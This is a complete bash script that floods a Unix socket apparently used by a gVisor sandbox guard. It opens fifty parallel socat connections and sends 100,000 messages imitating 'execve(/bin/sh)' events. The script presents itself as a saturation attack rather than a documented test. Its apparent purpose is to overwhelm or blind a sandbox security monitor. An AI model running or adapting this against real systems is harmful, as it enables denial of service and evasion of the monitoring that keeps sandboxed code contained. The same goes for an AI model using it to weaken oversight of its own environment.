#!/bin/bash
echo "[*] Launching Concurrent UDS Saturation Flood..."

# Spawn 50 parallel background connections
for i in {1..50}; do
    (
        # Each stream rapidly fires 2,000 unique payloads
        seq 1 2000 | awk -v core="$i" '{printf "execve(/bin/sh) --id=%04d%08d\n", core, $1}' | \
        socat - UNIX-CONNECT:/var/run/runsc-sentry-guard.sock
    ) &
done

wait
echo "[*] UDS parallel blast finished."